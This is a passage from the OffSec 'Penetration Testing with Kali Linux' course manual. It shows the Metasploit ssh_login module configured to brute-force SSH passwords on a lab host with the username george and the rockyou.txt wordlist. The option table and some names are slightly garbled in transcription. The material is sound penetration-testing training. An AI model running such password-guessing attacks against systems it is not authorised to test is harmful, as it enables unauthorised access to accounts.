# OffSec

Penetration Testing with Kali Linux

| No | SSH Version Corruption | |
|---|---||
| 20 | auxiliary/scanner/ssh/ssh_version | normal |
| No | SSH Version Scanner |

Listing 636 - Displaying all SSH auxiliary modules

The output lists an auxiliary module named auxiliary/scanner/ssh/ssh_login with a fitting description. We can activate it by using the index 15. Once the module is activated, we can display its options.

```
msf6 auxiliary(scanner/smb/version) > use 15
msf6 auxiliary(scanner/ssh/ssh_login) > show options
Module options (auxiliary(scanner/ssh/ssh_login))
```

| Name | Current Setting | Required | Description |
|---|---|---|---|
| PASSWORD | | no | A specific password to authenticate with |
| PASS_FILE | | no | File containing passwords, one per line |
| HOSTS | | yes | The target host(s), see |
| RPORT | | 22 | The target port |
| STOP_SUCCESS | false | | Stop guessing when a credentials works for a host |
| THREADS | 1 | yes | The number of concurrent threads (max per host) |
| USERNAME | | | A specific username to authenticate |
| USERPASS_FILE | | no | File containing users and passwords separated by space, one per line |
| USERPASS | false | no | Try the username as the password |
| USER_FILE | | | File containing users, one per line |
| VERBOSE | false | yes | Whether to print output for all attempts

Listing 637 - Display options of the ssh_login module

There are various options to set this module. Fortunately, Metasploit already set some for us. As with Hydra's, we can set a single password and user, or provide files containing users, passwords, or other.

In the example in Password Attacks, we assume we have identified the username. We can specify rocky, to set the PASS_FILE. Finally we use HOSTS to 192.168.50.201 and RPORT to 2222.

```
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
USERNAME => george
msf6 auxiliary(scanner/ssh/ssh_login) > set HOSTS 192.168.50.201
```

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.